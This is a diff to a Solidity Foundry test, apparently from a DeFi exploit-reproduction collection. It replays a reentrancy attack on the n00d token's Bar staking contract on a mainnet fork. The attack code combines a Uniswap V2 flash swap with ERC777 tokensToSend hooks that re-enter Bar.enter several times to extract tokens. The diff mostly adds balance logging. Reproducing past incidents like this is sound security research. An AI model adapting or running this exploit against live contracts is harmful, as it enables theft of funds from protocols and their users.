@@ -29,15 +29,37 @@ contract ContractTest is DSTest{
     
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
+    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
+    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+
     function setUp() public {
         cheats.createSelectFork("mainnet", 15826379);
     }
 
     function testExploit() public{
-        registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
+        emit log_named_decimal_uint(
+            "At First WETH: ",
+            WETH.balanceOf(address(this)),
+            18
+        );
+
+        registry.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
+        registry.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+        
+
+        //registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
+        
+        
         n00d.approve(address(Bar), type(uint).max);
         (n00dReserve, , ) = Pair.getReserves();
         Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
+
+        emit log_named_decimal_uint(
+            "After Swap done: ",
+            n00d.balanceOf(address(this)),
+            18
+        );
+
         uint amountIn = n00d.balanceOf(address(this));
         (uint n00dR, uint WETHR, ) = Pair.getReserves();
         uint amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);
@@ -52,8 +74,17 @@ contract ContractTest is DSTest{
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{
+
+        emit log_named_decimal_uint(
+            "uniswapV2Call callback: ",
+            n00d.balanceOf(address(this)),
+            18
+        );
+
         enterAmount = n00d.balanceOf(address(this)) / 5;
         Bar.enter(enterAmount);
+
+
         Bar.leave(Xn00d.balanceOf(address(this)));
         n00d.transfer(address(Pair), n00dReserve * 1000 / 997 + 1000);
     }
@@ -67,6 +98,12 @@ contract ContractTest is DSTest{
         bytes calldata operatorData
     ) external {
         if(to == address(Bar) && i < 4){
+            emit log_named_decimal_uint(
+                "tokensToSend: ",
+                Xn00d.balanceOf(address(this)),
+                18
+            );
+
             i++;
             Bar.enter(enterAmount);
         }
@@ -80,7 +117,13 @@ contract ContractTest is DSTest{
         uint256 amount,
         bytes calldata userData,
         bytes calldata operatorData
-    ) external {}
+    ) external {
+        emit log_named_decimal_uint(
+            "tokensReceived: ",
+            n00d.balanceOf(address(this)),
+            18
+        );
+    }
 
 
 }
